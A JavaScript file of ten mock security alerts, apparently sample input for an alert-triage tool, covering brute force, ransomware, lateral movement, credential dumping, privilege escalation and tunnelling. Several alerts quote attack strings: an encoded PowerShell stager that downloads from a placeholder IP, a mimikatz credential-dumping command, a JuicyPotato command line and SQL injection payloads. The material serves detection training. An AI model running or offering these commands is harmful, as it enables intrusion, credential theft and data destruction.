export const SAMPLE_ALERTS = [
  {
    id: 1,
    label: '1. Brute Force SSH',
    text: `Jan 15 03:22:41 webserver01 sshd[12345]: Failed password for root from 192.168.45.201 port 54312 ssh2
Jan 15 03:22:42 webserver01 sshd[12346]: Failed password for root from 192.168.45.201 port 54313 ssh2
Jan 15 03:22:43 webserver01 sshd[12347]: Failed password for admin from 192.168.45.201 port 54314 ssh2
Jan 15 03:22:44 webserver01 sshd[12348]: Failed password for root from 192.168.45.201 port 54315 ssh2
Jan 15 03:22:45 webserver01 sshd[12349]: Failed password for ubuntu from 192.168.45.201 port 54316 ssh2
Jan 15 03:22:46 webserver01 sshd[12350]: Failed password for pi from 192.168.45.201 port 54317 ssh2
Jan 15 03:22:47 webserver01 sshd[12351]: Failed password for root from 192.168.45.201 port 54318 ssh2
Jan 15 03:22:48 webserver01 sshd[12352]: Accepted password for root from 192.168.45.201 port 54319 ssh2
Jan 15 03:22:48 webserver01 sshd[12352]: pam_unix(sshd:session): session opened for user root by (uid=0)
ALERT: [CROWDSTRIKE] Authentication Brute Force Detected — 847 failed SSH attempts in 60 seconds from 192.168.45.201, followed by successful root login. Severity: HIGH`,
  },
  {
    id: 2,
    label: '2. Ransomware Staging',
    text: `{
  "alert_id": "EDR-20240115-003921",
  "sensor": "FALCON_SENSOR_7.14",
  "hostname": "WORKSTATION-042",
  "username": "jsmith",
  "timestamp": "2024-01-15T14:33:07.442Z",
  "event_type": "FileSystemEvent",
  "severity": "CRITICAL",
  "events": [
    {"action": "FILE_RENAME", "source": "C:\\\\Users\\\\jsmith\\\\Documents\\\\Q4_Report.docx", "destination": "C:\\\\Users\\\\jsmith\\\\Documents\\\\Q4_Report.docx.encrypted"},
    {"action": "FILE_RENAME", "source": "C:\\\\Users\\\\jsmith\\\\Documents\\\\budget_2024.xlsx", "destination": "C:\\\\Users\\\\jsmith\\\\Documents\\\\budget_2024.xlsx.encrypted"},
    {"action": "FILE_RENAME", "source": "C:\\\\Users\\\\jsmith\\\\Desktop\\\\passwords.kdbx", "destination": "C:\\\\Users\\\\jsmith\\\\Desktop\\\\passwords.kdbx.encrypted"},
    {"action": "FILE_CREATE", "path": "C:\\\\Users\\\\jsmith\\\\Documents\\\\README_DECRYPT.txt"},
    {"action": "FILE_CREATE", "path": "C:\\\\Users\\\\jsmith\\\\Desktop\\\\README_DECRYPT.txt"}
  ],
  "process": {"name": "svchosts.exe", "pid": 4821, "parent": "explorer.exe", "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "path": "C:\\\\Windows\\\\Temp\\\\svchosts.exe"},
  "file_rename_count_1min": 1847,
  "network_connections": [{"dst_ip": "45.33.32.156", "dst_port": 443, "protocol": "TCP", "bytes_out": 2048}],
  "detection_name": "RANSOMWARE_STAGING_ACTIVITY"
}`,
  },
  {
    id: 3,
    label: '3. Lateral Movement via PsExec',
    text: `EventID: 7045 (Service Install)
TimeCreated: 2024-01-15T09:12:33.000Z
Computer: DC01.corp.internal
ServiceName: PSEXESVC
ImagePath: %SystemRoot%\\PSEXESVC.exe
ServiceType: User Mode Service
StartType: Demand start
AccountName: LocalSystem
SubjectUserName: Administrator
SubjectDomainName: CORP
SubjectLogonId: 0x3E7

[Repeated on 6 additional hosts: WKSTN-015, WKSTN-022, WKSTN-031, WKSTN-044, WKSTN-055, SERVER-DB01]

EventID: 4648 (Logon using explicit credentials)
TargetServerName: DC01.corp.internal
SubjectUserName: CORP\\svc_backup
TargetUserName: Administrator
ProcessName: C:\\Windows\\System32\\cmd.exe

SIEM Correlation Rule: LATERAL_MOVEMENT_PSEXEC_MULTI_HOST — PsExec service installed across 7 hosts within 8 minutes from single source WKSTN-001 (10.10.1.50), using credentials of svc_backup service account.`,
  },
  {
    id: 4,
    label: '4. Data Exfiltration',
    text: `{
  "alert_source": "Darktrace",
  "alert_type": "UNUSUAL_OUTBOUND_DATA_TRANSFER",
  "device": {"ip": "10.20.1.105", "hostname": "FINANCE-PC-07", "user": "mwilliams"},
  "timestamp": "2024-01-15T22:47:12Z",
  "destination": {"ip": "185.220.101.47", "country": "RU", "asn": "AS60781", "reputation": "MALICIOUS", "port": 443},
  "transfer": {"bytes_out": 4831838208, "bytes_in": 12288, "duration_seconds": 1847, "protocol": "HTTPS"},
  "baseline_comparison": {"avg_daily_outbound_gb": 0.4, "current_outbound_gb": 4.5, "deviation_percent": 1025},
  "threat_intel": {"ip_listed_in": ["EmergingThreats", "AbuseIPDB", "FeodoTracker"], "last_seen_as": "Cobalt Strike C2"},
  "process": {"name": "OneDrive.exe", "pid": 3312, "commandline": "C:\\\\Program Files\\\\Microsoft OneDrive\\\\OneDrive.exe /background"},
  "note": "Transfer began 4 minutes after user authenticated to SharePoint and accessed /Finance/2023_Annual_Report_DRAFT/ folder (143 files, 4.2GB)"
}`,
  },
  {
    id: 5,
    label: '5. Credential Dumping (LSASS)',
    text: `[DEFENDER_ATP] Alert: Credential Dumping Attempt
Severity: High
Machine: JUMPHOST-01 (10.10.0.5)
User: CORP\\tharris (non-privileged)
Time: 2024-01-15 16:08:44 UTC

Process Activity:
  Process: mimikatz.exe (renamed as 'svchost32.exe')
  PID: 7823
  Parent: powershell.exe (PID 7701)
  SHA256: 92dc6ef8883153543c7dfb7b3f0c5f6e2e0d8c4a1f9e2b7d6c5a4b3f2e1d0c9b
  Command: sekurlsa::logonpasswords

Memory Access Events:
  Source Process: svchost32.exe (PID 7823)
  Target Process: lsass.exe (PID 688)
  Access Rights: PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
  CallStack: OpenProcess -> ReadProcessMemory

Network: DNS query for pastebin.com immediately following LSASS access
Registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential set to 1`,
  },
  {
    id: 6,
    label: '6. PowerShell Empire C2',
    text: `EventID: 4104 (PowerShell Script Block Logging)
TimeCreated: 2024-01-15T11:23:01Z
Computer: WORKSTATION-088
SubjectUserName: bjenkins

ScriptBlockText:
powershell.exe -NoP -sta -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLAHYAVgBVAAAA

Network Connection (correlating EventID 3):
  SourceIP: 10.30.2.88
  DestIP: 203.0.113.45
  DestPort: 443
  BytesSent: 892
  BytesReceived: 24576
  UserAgent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"

Decoded payload fragment (partial): ...Invoke-Expression... New-Object Net.WebClient... DownloadString... http://203.0.113.45/news.php...

SIEM: POWERSHELL_ENCODED_BEACON — matches Empire stager pattern. Beacon interval detected: 60s ± 5s jitter. Process tree: explorer.exe → winword.exe → powershell.exe`,
  },
  {
    id: 7,
    label: '7. Privilege Escalation',
    text: `{
  "source": "Windows Security Event Log",
  "events": [
    {
      "EventID": 4672,
      "time": "2024-01-15T13:55:20Z",
      "account": "CORP\\\\low_priv_svc",
      "privileges": ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege"],
      "logon_id": "0x4A2F8C"
    },
    {
      "EventID": 4624,
      "time": "2024-01-15T13:55:21Z",
      "account": "NT AUTHORITY\\\\SYSTEM",
      "logon_type": 2,
      "parent_account": "CORP\\\\low_priv_svc",
      "process": "JuicyPotato.exe"
    }
  ],
  "process_details": {
    "name": "JuicyPotato.exe",
    "sha256": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
    "path": "C:\\\\Windows\\\\Temp\\\\JuicyPotato.exe",
    "commandline": "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}"
  },
  "alert": "SERVICE_ACCOUNT_PRIVILEGE_ESCALATION — CORP\\\\low_priv_svc leveraged SeImpersonatePrivilege via known potato exploit to obtain SYSTEM token on WEB-SRV-03"
}`,
  },
  {
    id: 8,
    label: '8. SQL Injection Attempt',
    text: `2024-01-15 08:44:17 [WAF-ALERT] ModSecurity: Access denied with code 403
Host: shop.example.com
Client: 91.108.4.22
Request: GET /products/search?q=1%27+UNION+SELECT+null%2C+username%2C+password%2C+null+FROM+users--&category=electronics HTTP/1.1
User-Agent: sqlmap/1.7.9#stable (https://sqlmap.org)
Referer: -
Rule matched: 942100 (SQL Injection Attack Detected via libinjection)
Rule matched: 942200 (Detects MySQL comment-/space-obfuscated injections and backtick termination)
Rule matched: 942410 (SQL Injection Attack)
Paranoia Level: 1
Score: 35 (threshold: 5)

Additional requests from same IP (last 60 seconds):
  GET /products/search?q=1' OR '1'='1 → 403
  GET /products/search?q=admin'-- → 403
  GET /login?user=admin'%23&pass=anything → 403
  GET /products/search?q='; DROP TABLE products;-- → 403
  POST /api/login {"username":"' OR 1=1--","password":"x"} → 403

IP Reputation: 91.108.4.22 listed in Spamhaus DROP, known Tor exit node. 847 requests in last 10 minutes.`,
  },
  {
    id: 9,
    label: '9. DNS Tunneling',
    text: `{
  "alert": "DNS_TUNNELING_SUSPECTED",
  "sensor": "Zeek IDS / dns.log",
  "timewindow": "2024-01-15T17:00:00Z to 2024-01-15T17:05:00Z",
  "source_host": {"ip": "10.50.2.77", "hostname": "LAP-MGARCIA-01"},
  "dns_resolver": "8.8.8.8",
  "stats": {
    "total_queries": 3421,
    "unique_subdomains": 3398,
    "avg_subdomain_length": 52,
    "max_subdomain_length": 63,
    "query_types": {"TXT": 2891, "A": 312, "AAAA": 218},
    "queries_per_minute": 684
  },
  "sample_queries": [
    "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.c2.tunnel.c2server.net TXT",
    "dGhpcyBpcyBzb21lIGRhdGEgYmVpbmcgZXhmaWx0cmF0ZWQ.c2.tunnel.c2server.net TXT",
    "bW9yZSBkYXRhIHRvIGV4ZmlsdHJhdGUgaGVyZQ.c2.tunnel.c2server.net TXT"
  ],
  "entropy_scores": {"avg": 4.87, "threshold": 3.5},
  "baseline_qpm": 12,
  "deviation_factor": 57,
  "process_correlation": {"process": "iexplore.exe", "pid": 5544, "parent": "svchost.exe"},
  "note": "Subdomain labels contain high-entropy base64-encoded data consistent with DNS tunneling tools (dnscat2/iodine pattern)"
}`,
  },
  {
    id: 10,
    label: '10. Insider Threat — Bulk Download',
    text: `SIEM Correlation Alert — INSIDER_THREAT_BULK_DOWNLOAD
Generated: 2024-01-15 02:17:44 UTC
Risk Score: 87/100

User: CORP\\rkumar (Richard Kumar, Sr. Software Engineer, tenure 3.2 years)
Workstation: WKSTN-RKUMAR (10.10.5.44)
Active Hours Baseline: Mon-Fri 08:30-18:30 EST
Alert Time: 2024-01-15 02:12:00 UTC (outside baseline by 7.5 hours)

File Server Activity (\\\\FILESERVER01\\Engineering):
  Files accessed: 2,341
  Files downloaded: 2,341 (100% download rate — unusual)
  Total data: 18.7 GB
  Duration: 23 minutes
  Folders accessed: /src/, /designs/, /patents/, /roadmap/, /customer_data/

HR System Cross-Reference:
  Resignation submitted: 2024-01-12 (3 days ago)
  Last working day: 2024-01-26
  Access deprovisioning scheduled: 2024-01-27

DLP Events (last 72 hours):
  - 14 large file uploads to personal Google Drive
  - USB mass storage device connected: 2024-01-14 18:55 (16GB drive)
  - Email: 3 messages sent to personal Gmail (rkumar.personal@gmail.com) with attachments

Anomaly: First after-hours access in 847 days of employment.`,
  },
];
